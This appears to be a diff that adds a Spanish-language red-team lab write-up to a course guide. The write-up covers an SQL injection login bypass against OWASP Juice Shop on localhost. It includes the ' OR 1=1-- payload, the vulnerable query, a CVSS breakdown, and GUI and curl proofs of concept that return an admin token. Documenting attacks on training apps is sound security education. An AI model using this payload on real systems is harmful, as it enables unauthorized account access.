@@ -190,6 +190,173 @@ done
 - **Real**: ___ minutos
 
 ---
+## Actividades Red Team
+
+### Vulnerabilidad 1 — SQL Injection (Login Bypass)
+
+**Clasificación**: OWASP A03:2021 – Injection  
+**CVSS v3.1**: 9.8 CRITICAL  
+**Endpoint vulnerable**: `POST /rest/user/login`  
+**Ruta en la aplicación**: `http://localhost:3000/#/login`  
+
+---
+
+#### 1. Descripción técnica
+
+Durante la fase de pruebas del Red Team en la aplicación **OWASP Juice Shop**, se identificó una vulnerabilidad crítica de **inyección SQL** en el formulario de autenticación.
+
+El parámetro `email` enviado desde el formulario de login se utiliza directamente dentro de una consulta SQL **sin sanitización** ni uso de *prepared statements*. Esto permite:
+
+- Cerrar la cadena original del correo.
+- Inyectar una condición booleana siempre verdadera (`OR 1=1`).
+- Comentar el resto de la instrucción con `--`.
+
+Como consecuencia, la aplicación **no valida la contraseña** y permite acceder con cualquier cuenta, incluyendo la del administrador.
+
+---
+
+#### 2. Pasos concretos para reproducir
+
+##### Paso 1 — Ingresar al formulario de login
+
+Abrir en el navegador:
+
+```text
+http://localhost:3000/#/login
+```
+
+##### Paso 2 — Inyectar el payload en el campo *Email*
+
+En el campo **Email** ingresar:
+
+```text
+' OR 1=1--
+```
+
+##### Paso 3 — Contraseña
+
+En el campo **Password** escribir cualquier valor (no es relevante para la explotación).
+
+##### Paso 4 — Ejecutar el ataque
+
+Presionar el botón:
+
+```text
+Log in
+```
+
+##### Resultado esperado
+
+- Se inicia sesión sin conocer la contraseña real.  
+- Es posible autenticarse como un usuario válido, incluso con privilegios elevados (por ejemplo, administrador).  
+
+---
+
+#### 3. Payload utilizado
+
+```text
+' OR 1=1--
+```
+
+**Explicación del payload:**
+
+- `'` → Cierra la cadena del email en la consulta SQL original.  
+- `OR 1=1` → Condición booleana que siempre es verdadera.  
+- `--` → Comenta el resto de la sentencia SQL (incluyendo la validación de la contraseña).  
+
+Esto provoca una consulta interna similar a:
+
+```sql
+SELECT * FROM Users
+WHERE email = '' OR 1=1--' AND password = '123';
+```
+
+Al volverse siempre verdadera la condición del `WHERE`, el sistema devuelve el primer usuario de la tabla (por ejemplo, el admin) y genera un token de autenticación válido.
+
+---
+
+#### 4. Impacto probable (Confidencialidad / Integridad / Disponibilidad)
+
+| Componente       | Impacto | Descripción                                                                       |
+|------------------|---------|-----------------------------------------------------------------------------------|
+| Confidencialidad | Crítica | Se obtiene acceso a cuentas reales, incluyendo cuentas administrativas.          |
+| Integridad       | Crítica | El atacante puede editar usuarios, productos, pedidos y otros registros.        |
+| Disponibilidad   | Alta    | El atacante puede borrar datos, afectar el funcionamiento normal de la aplicación.|
+
+---
+
+#### 5. CVSS v3.1 — Score básico estimado
+
+**Puntaje**: `9.8` **CRITICAL**  
+**Vector**:
+
+```text
+AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+```
+
+**Justificación de cada métrica:**
+
+- **AV:N (Attack Vector: Network)** → El ataque se realiza remotamente vía HTTP.  
+- **AC:L (Attack Complexity: Low)** → El payload es trivial y no requiere condiciones especiales.  
+- **PR:N (Privileges Required: None)** → No se necesitan credenciales previas.  
+- **UI:N (User Interaction: None)** → No requiere interacción adicional de otro usuario.  
+- **S:U (Scope: Unchanged)** → Afecta únicamente el sistema objetivo.  
+- **C:H (Confidentiality: High)** → Acceso a información de todos los usuarios.  
+- **I:H (Integrity: High)** → Posibilidad de modificar datos críticos en la base de datos.  
+- **A:H (Availability: High)** → Posibilidad de borrar datos y afectar seriamente la disponibilidad.  
+
+---
+
+#### 6. Prueba de concepto (PoC) reproducible
+
+##### PoC vía interfaz gráfica (GUI)
+
+1. Abrir `http://localhost:3000/#/login`.  
+2. En **Email**, escribir:
+
+   ```text
+   ' OR 1=1--
+   ```
+
+3. En **Password**, escribir cualquier texto.  
+4. Presionar **Log in**.  
+
+La aplicación permite el acceso sin validar credenciales reales.
+
+##### PoC vía `curl` (línea de comandos)
+
+El siguiente comando `curl` envía una petición manual al endpoint de autenticación, inyectando el payload SQL para omitir la verificación de credenciales:
+
+```bash
+curl -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"' OR 1=1--\",\"password\":\"123\"}"
+```
+
+**Explicación:**
+
+- El campo `email` contiene la inyección SQL.  
+- El campo `password` es irrelevante para la validación.  
+- El backend construye una consulta vulnerable, permitiendo el *bypass* de autenticación.  
+
+**Respuesta esperada (ejemplo simplificado):**
+
+```json
+{
+  "authentication": {
+    "token": "<token_JWT_valido>",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+```
+
+✔ La inyección SQL fue exitosa  
+✔ El sistema otorgó un token JWT válido  
+✔ Se accedió directamente como un usuario legítimo (posiblemente admin)  
+✔ La autenticación fue completamente burlada  
+
+---
 
 ## Paso 2: Elasticsearch
 
